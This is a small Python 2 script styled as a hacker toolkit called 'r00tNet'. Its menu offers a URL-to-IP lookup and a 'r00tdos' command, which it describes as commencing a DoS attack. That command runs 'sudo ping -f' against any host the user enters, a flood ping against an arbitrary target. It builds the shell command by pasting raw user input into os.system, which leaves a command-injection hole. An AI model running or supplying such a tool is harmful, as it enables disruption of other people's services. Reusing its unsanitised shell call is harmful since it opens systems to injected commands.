# coding: utf-8

import os
import sys
import time
import socket

class colors:
	R = '\033[91m'
	W = '\033[0m'

def main():
	os.system("clear")
	print(colors.R + """
 ██▀███   ▒█████   ▒█████  ▄▄▄█████▓ ███▄    █ ▓█████▄▄▄█████▓
▓██ ▒ ██▒▒██▒  ██▒▒██▒  ██▒▓  ██▒ ▓▒ ██ ▀█   █ ▓█   ▀▓  ██▒ ▓▒
▓██ ░▄█ ▒▒██░  ██▒▒██░  ██▒▒ ▓██░ ▒░▓██  ▀█ ██▒▒███  ▒ ▓██░ ▒░
▒██▀▀█▄  ▒██   ██░▒██   ██░░ ▓██▓ ░ ▓██▒  ▐▌██▒▒▓█  ▄░ ▓██▓ ░ 
░██▓ ▒██▒░ ████▓▒░░ ████▓▒░  ▒██▒ ░ ▒██░   ▓██░░▒████▒ ▒██▒ ░ 
░ ▒▓ ░▒▓░░ ▒░▒░▒░ ░ ▒░▒░▒░   ▒ ░░   ░ ▒░   ▒ ▒ ░░ ▒░ ░ ▒ ░░   
  ░▒ ░ ▒░  ░ ▒ ▒░   ░ ▒ ▒░     ░    ░ ░░   ░ ▒░ ░ ░  ░   ░    
  ░░   ░ ░ ░ ░ ▒  ░ ░ ░ ▒    ░         ░   ░ ░    ░    ░      
   ░         ░ ░      ░ ░                    ░    ░  ░     

                  +-==[Version: 1.0]==-+
                  +-==[Coded by r00t]==-+

                  Type 'help' for commands
""" + colors.W)
	rnet = raw_input("r00tNet> ")
	if "help" in rnet:
		help()
	elif "exit" in rnet:
		os.system("clear")
		sys.exit()
	elif "webip" in rnet:
		webip()
	elif "r00tdos" in rnet:
		rdos()
	else:
		print("")
		print("That is not a command.")
		time.sleep(3)
		main()

def help():
	print("")
	print("help | displays commands for r00tNet")
	print("webip | allows user to get IP address for a URL")
	print("r00tdos | allows user to commence a DoS attack")
	print("exit | exits the program")
	time.sleep(5)
	main()

def webip():
	print("")
	print("Enter a URL.")
	print("")
	webip = raw_input("r00tNet(webip)> ")
	print("")
	print("IP for " + webip + ": " + socket.gethostbyname(webip))
	time.sleep(4)
	main()

def rdos():
	print("")
	print("Enter a URL/IP.")
	print("")
	rdos = raw_input("r00tNet(r00tdos)> ")
	print("")
	os.system("sudo ping -f " + rdos)
	time.sleep(4)
	main()

main()
